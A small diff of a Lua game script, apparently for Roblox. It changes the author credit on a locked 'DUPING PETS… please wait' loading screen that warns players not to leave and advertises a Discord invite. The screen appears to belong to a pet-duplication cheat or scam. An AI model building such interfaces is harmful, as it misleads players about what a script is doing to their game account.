@@ -145,7 +145,7 @@ local function showLockedLoading()
 	status.TextColor3, status.Text, status.ZIndex = Color3.fromRGB(230,230,230), "DUPING PETS… please wait", 10001
 
 	infoLine("⚠  Do NOT leave – progress will be lost", 0.62, Color3.fromRGB(210,60,60))
-	infoLine("by Yoshi", 0.68, Color3.fromRGB(180,180,180))
+	infoLine("made by whqtt", 0.68, Color3.fromRGB(180,180,180))
 	infoLine("Join our Discord: https://discord.gg/bNnyqVVe", 0.92, Color3.fromRGB(114,137,218), 0.04)
 
 	-----------------------------------------------------------------
